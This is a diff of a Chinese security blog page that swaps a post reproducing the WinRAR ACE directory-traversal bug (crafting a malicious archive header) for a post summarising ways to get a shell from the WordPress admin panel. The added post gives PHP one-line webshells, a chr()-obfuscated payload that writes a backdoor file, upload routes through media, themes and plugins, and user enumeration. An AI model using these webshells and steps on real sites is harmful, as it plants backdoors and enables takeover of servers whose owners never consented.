@@ -4,8 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="WinRAR目录穿越漏洞复现, dylan&#39;s blog">
-    <meta name="description" content="0x01 漏洞概述该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而Wi">
+    <meta name="keywords" content="Wordpress 后台GetShell总结, dylan&#39;s blog">
+    <meta name="description" content="0x00 前言Wordpress后台Getshell的方法网上公开了很多，在此记录总结一下
+相比于前台，wordpress后台的防御的就低得多Wordpress的插件和主题功都可以上传和线编辑很容易就可以插入木马getshell
+?auth">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>WinRAR目录穿越漏洞复现 | dylan&#39;s blog</title>
+    <title>Wordpress 后台GetShell总结 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -273,13 +275,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        WinRAR目录穿越漏洞复现
+                        Wordpress 后台GetShell总结
                     </div>
                 </div>
             </div>
@@ -390,20 +392,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/Wordpress/" target="_blank">
+                                <span class="chip bg-color">Wordpress</span>
                             </a>
                         
-                            <a href="/tags/复现/" target="_blank">
-                                <span class="chip bg-color">复现</span>
-                            </a>
-                        
-                            <a href="/tags/WinRAR/" target="_blank">
-                                <span class="chip bg-color">WinRAR</span>
-                            </a>
-                        
-                            <a href="/tags/目录穿越/" target="_blank">
-                                <span class="chip bg-color">目录穿越</span>
+                            <a href="/tags/GetShell/" target="_blank">
+                                <span class="chip bg-color">GetShell</span>
                             </a>
                         
                     </div>
@@ -426,14 +420,14 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-07-26
+                    2019-11-06
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        570
+                        521
                     </div>
                     
 
@@ -456,35 +450,31 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，<br>没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。<br>而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，<br>将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p>
-<hr>
-<h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p><strong>影响版本：</strong><br>       * WinRAR &lt; 5.70 Beta 1<br>       * Bandizip &lt; = 6.2.0.0<br>       * 好压(2345压缩) &lt; = 5.9.8.10907<br>       * 360压缩 &lt; = 4.0.0.1170<br>       * ……</p>
-<hr>
-<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>新建一个任意文件，名称类型内容随意<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155542.png" alt></p>
-<p>使用Winace进行压缩<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155906.png" alt></p>
-<p>然后下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本<br>输入命令<code>python acefile.py --headers test.ace</code> 读取文件的头部信息<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160308.png" alt></p>
-<p>ok，开始构造恶意文件<br>用 010Editor 打开test.ace文件<br>需要修改以下参数：</p>
-<ul>
-<li>hdr_crc</li>
-<li>hdr_size</li>
-<li>filename的长度</li>
-<li>filename<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160517.png" alt><br>首先将filename的值改为 <code>d:\d:\liehu.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161040.png" alt></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161237.png" alt></p>
-<p>修改后的filename的长度，选中它，左下角就是它的长度15，16进制为00 0F，filename的前两位就是它的长度<br>修改顺序是由后到前，即将10改为0F即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161841.png" alt></p>
-<p>修改<strong>hdr_size</strong>，选中如下位置，左下角查看其长度，这里是（00 2E），选中的前面的红框就是hdr_size<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162147.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162439.png" alt></p>
-<p>最后修改<strong>hdr_crc</strong>，再次运行<br><code>python acefile.py --headers test.ace</code><br>CRC校验失败，报错<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162831.png" alt><br>在acefile.py文件中查找 <code>header CRC failed</code><br>在其上面一行添加输出语句，输出ace_crc16(buf)，即为我们需要的<strong>hdr_crc</strong>的值<br><code>print (ace_crc16(buf), buf)</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163206.png" alt></p>
-<p>改好保存，再次运行<br><code>python acefile.py --headers test.ace</code><br>31102即我们需要的值，转换成16进制为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163625.png" alt></p>
-<p>将<strong>hdr_size</strong> 前面的两位即为<strong>hdr_crc</strong>，从右到左修改为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164206.png" alt></p>
-<p>再次运行<br><code>python acefile.py --headers test.ace</code><br>输出如下信息无报错，就成功了，用开头所述解压工具解压test.ace，就会在红框的路径生成对应的文件。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164506.png" alt></p>
-<hr>
-<h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ol>
-<li>升级最新的WinRAR ，目前版本是 5.71 </li>
-<li>winRAR安装目录下，删除UNACEV2.dll文件</li>
-</ol>
-<hr>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/" target="_blank" rel="noopener">WinRAR漏洞复现过程</a><br><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research</a></p>
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Wordpress后台Getshell的方法网上公开了很多，在此记录总结一下</p>
+<p>相比于前台，wordpress后台的防御的就低得多<br>Wordpress的插件和主题功都可以上传和线编辑<br>很容易就可以插入木马getshell</p>
+<p><code>?author=1</code> 遍历用户名</p>
+<h1 id="0x01-在线编辑getshell"><a href="#0x01-在线编辑getshell" class="headerlink" title="0x01 在线编辑getshell"></a>0x01 在线编辑getshell</h1><h2 id="编辑主题"><a href="#编辑主题" class="headerlink" title="编辑主题"></a>编辑主题</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>在后台找到主题外观编辑<br>选择主题，在右侧选择php文件</p>
+<p>在<code>PHP</code>标签内写入 <code>@eval($_POST[a]);</code><br>或者在<code>PHP</code>标签外写入 <code>&lt;?php @eval($_POST[&#39;code&#39;]);?&gt;</code><br>提交更改</p>
+<p>路径为<br><code>url+/wp-content/themes/+主题名/+修改文件的文件名</code></p>
+<p>连接即可</p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107003059.png" alt></p>
+<p>也可以在这里写入</p>
+<p><code>url+/wp-content/themes/Begin/inc/xxx.php</code></p>
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>进入主题编辑器，选择要编辑的主题，要编辑的文件<br>插入下方payload,然后访问之<br>(报下图错不用管)<br><code>url+/wp-content/themes/编辑的主题/编辑的文件</code></p>
+<p>这样就在该目录下生成一句话木马文件<br>文件名  <code>a.php</code>   密码  <code>a</code><br>路径 <code>url+/wp-content/themes/编辑的主题/a.php</code></p>
+<pre><code>&lt;script language=&quot;php&quot;&gt;fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;/script&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107001505.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107002023.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107002415.png" alt></p>
+<h2 id="编辑插件"><a href="#编辑插件" class="headerlink" title="编辑插件"></a>编辑插件</h2><p>和编辑主题思路方法一致</p>
+<p>路径为</p>
+<p><code>url+/wordpress321/wp-content/plugins/+更改的插件名+/+更改的文件名</code></p>
+<h1 id="0x02-上传getshell"><a href="#0x02-上传getshell" class="headerlink" title="0x02 上传getshell"></a>0x02 上传getshell</h1><h2 id="媒体上传"><a href="#媒体上传" class="headerlink" title="媒体上传"></a>媒体上传</h2><p>在WordPress管理页面的左边单击“媒体”-“新增媒体案”<br>接着就会出来一个上传的界面，在该界面中选择“Browser 上傳功能”<br>直接选择php的Webshell上传即可；</p>
+<h2 id="上传主题"><a href="#上传主题" class="headerlink" title="上传主题"></a>上传主题</h2><p>上传一个压缩了木马的zip<br>或者在官方主题中加入木马重新打包成zip更好<br>则木马路径为</p>
+<p><code>url+/wp-content/themes/+主题名+/木马名</code></p>
+<h2 id="上传插件"><a href="#上传插件" class="headerlink" title="上传插件"></a>上传插件</h2><p>和上传主题的思路一样</p>
+<p>路径为</p>
+<p><code>url+/wp-content/plugins/+插件名+/木马名</code></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.i0day.com/227.html" target="_blank" rel="noopener">wordpress 后台拿webshell</a><br><a href="https://www.jianshu.com/p/ffdbc362b69a" target="_blank" rel="noopener">Wordpress后台Getshell</a></p>
 
             </div>
             <hr/>
@@ -643,9 +633,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《WinRAR目录穿越漏洞复现》
+                    《Wordpress 后台GetShell总结》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/06/wordpress-hou-tai-getshell-zong-jie/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -944,30 +934,32 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/">
+                <a href="/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Ciuis CRM 1.6 - 'eventType' SQL Inj.复现">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Wordpress 后台GetShell总结">
                         
-                        <span class="card-title">Ciuis CRM 1.6 - 'eventType' SQL Inj.复现</span>
+                        <span class="card-title">Wordpress 后台GetShell总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x01 漏洞详情===========================================================================================
-# Exploit Title: Ci
+                            0x00 前言Wordpress后台Getshell的方法网上公开了很多，在此记录总结一下
+相比于前台，wordpress后台的防御的就低得多Wordpress的插件和主题功都可以上传和线编辑很容易就可以插入木马getshell
+?auth
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -980,19 +972,16 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞复现/" target="_blank">
-                        <span class="chip bg-color">漏洞复现</span>
+                    <a href="/tags/Wordpress/" target="_blank">
+                        <span class="chip bg-color">Wordpress</span>
                     </a>
                     
-                    <a href="/tags/Ciuis-CRM-1-6/" target="_blank">
-                        <span class="chip bg-color">Ciuis CRM 1.6</span>
-                    </a>
-                    
-                    <a href="/tags/SQL-Inj/" target="_blank">
-                        <span class="chip bg-color">SQL Inj.</span>
+                    <a href="/tags/GetShell/" target="_blank">
+                        <span class="chip bg-color">GetShell</span>
                     </a>
                     
                 </div>
@@ -1006,24 +995,25 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/">
+                <a href="/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="树洞外链X_FORWARDED_FOR注入漏洞复现">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="海洋cms(SEACMS) 漏洞整合复现">
                         
-                        <span class="card-title">树洞外链X_FORWARDED_FOR注入漏洞复现</span>
+                        <span class="card-title">海洋cms(SEACMS) 漏洞整合复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、漏洞概述树洞外链现在已经停止更新，作者又开发了Cloudreve，有兴趣可以了解一下。回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可
+                            0x00 漏洞概述海洋CMS V6.28 存在命令执行漏洞，漏洞具体内容参见： 海洋CMS V6.28 命令执行 0DAY
+在2017年2月，海洋CMS 6.45版本存在一个前台getshell漏洞，漏洞具体内容参见：SeaCMS v6.4
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-04
                             </span>
                         <span class="publish-author">
                             
@@ -1044,8 +1034,16 @@
                         <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/树洞外链/" target="_blank">
-                        <span class="chip bg-color">树洞外链</span>
+                    <a href="/tags/Command-Execution/" target="_blank">
+                        <span class="chip bg-color">Command Execution</span>
+                    </a>
+                    
+                    <a href="/tags/海洋cms/" target="_blank">
+                        <span class="chip bg-color">海洋cms</span>
+                    </a>
+                    
+                    <a href="/tags/Seacms/" target="_blank">
+                        <span class="chip bg-color">Seacms</span>
                     </a>
                     
                 </div>
